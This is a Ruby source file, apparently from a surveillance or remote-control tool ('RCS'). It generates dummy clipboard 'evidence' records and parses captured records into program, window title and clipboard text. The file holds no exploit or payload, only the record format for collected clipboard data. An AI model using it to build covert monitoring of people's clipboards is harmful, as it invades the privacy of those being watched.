require 'rcs-common/evidence/common'

module RCS

module ClipboardEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    process = "Notepad.exe".to_utf16le_binary_null
    window = "New Document".to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write process
    content.write window
    content.write "1234567890".to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:data][:program] = ''
      @info[:data][:window] = ''
      @info[:data][:content] = ''

      process = stream.read_utf16le_string
      @info[:data][:program] = process.utf16le_to_utf8 unless process.nil?
      window = stream.read_utf16le_string
      @info[:data][:window] = window.utf16le_to_utf8 unless window.nil?
      clipboard = stream.read_utf16le_string
      @info[:data][:content] = clipboard.utf16le_to_utf8 unless clipboard.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed CLIPBOARD (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS